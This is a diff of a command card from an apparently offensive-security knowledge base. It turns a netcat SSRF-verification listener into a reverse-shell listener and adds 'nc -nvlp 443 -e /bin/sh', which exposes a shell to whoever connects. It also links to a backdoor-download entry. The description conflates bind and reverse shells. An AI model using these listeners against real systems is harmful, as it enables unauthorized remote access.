@@ -1,17 +1,18 @@
 ---
-id: cmd-nc-listener
-data: nc -l 1337
+data: nc -nvl 80
 tags:
   - listener
-  - tcp
-  - verification
+  - reverse-shell
+  - nc
 type: command
 output: null
 executor: bash
 platforms:
+  - macOS
   - Linux
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:53:38.063Z'
+updated_at: '2025-12-14T17:23:41.260Z'
+id: cb829f16-f222-438d-9bcd-f93cf28c43f7
 verified: false
 validated: true
 submitted: true
@@ -21,43 +22,41 @@ submitted: true
 ## Command
 
 ```bash
-nc -l 1337
+nc -nvl 80
 ```
 
 ## Description
 
-Netcat in listen mode to capture incoming TCP connections from SSRF, e.g., when appending query params to force Ruby refetch.
+Sets up netcat as a TCP listener on port 80 without DNS lookups, ready to accept reverse shell connections and spawn an interactive shell.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| -l | Listen mode | Yes |
-| 1337 | Port to bind | Yes |
+| `-n` | No DNS resolution | Yes |
+| `-v` | Verbose output | Yes |
+| `-l` | Listen mode | Yes |
+| `80` | Port to bind | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-nc -l 1337
+nc -nvl 80
 ```
 
 ### Advanced Usage
 
 ```bash
-nc -l -p 1337 -v
+nc -nvlp 443 -e /bin/sh
 ```
-(Verbose output)
 
 ## Expected Output
 
-Connection from [target IP] 12345
-GET / HTTP/1.1
-Host: 192.166.218.53:1337
-User-Agent: Ruby
+'listening on [any] 80 ...' followed by connection details like 'connect to [victim_ip] from (victim_ip) [port]' and an interactive shell prompt upon callback.
 
 ## Related
 
-- [[procedures/Verify-SSRF-Exploitation-in-Logs]]
-- [[tools/Netcat]]
+- [[commands/curl-backdoor-download]]
+- [[procedures/Set-Up-Reverse-Shell-Listener]]
